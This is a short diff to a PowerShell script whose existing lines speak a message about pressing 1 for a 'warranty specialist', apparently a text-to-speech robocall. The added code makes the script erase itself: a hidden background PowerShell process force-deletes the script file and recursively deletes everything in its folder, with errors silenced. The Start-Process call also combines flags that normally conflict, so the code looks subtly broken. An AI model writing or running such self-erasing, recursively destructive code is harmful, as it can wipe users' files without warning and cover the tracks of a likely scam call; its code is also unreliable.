@@ -54,3 +54,14 @@ press 1 to speak with a warranty specialist.")
 while ($speak.State -ne 'Ready') {
     Start-Sleep -Milliseconds 500
 }
+
+# Get the Current Script Path
+$scriptPath = $MyInvocation.MyCommand.Path
+$scriptFolder = Split-Path -Path $scriptPath -Parent
+
+# Delete the Script File and Related Files
+Start-Sleep -Seconds 2  # Ensure script finishes before deleting
+Write-Host "Deleting script and related files..."
+
+# Use a separate PowerShell process to delete the script after execution
+Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 1; Remove-Item -Path '$scriptPath' -Force; Remove-Item -Path '$scriptFolder\*' -Force -Recurse -ErrorAction SilentlyContinue`"" -NoNewWindow
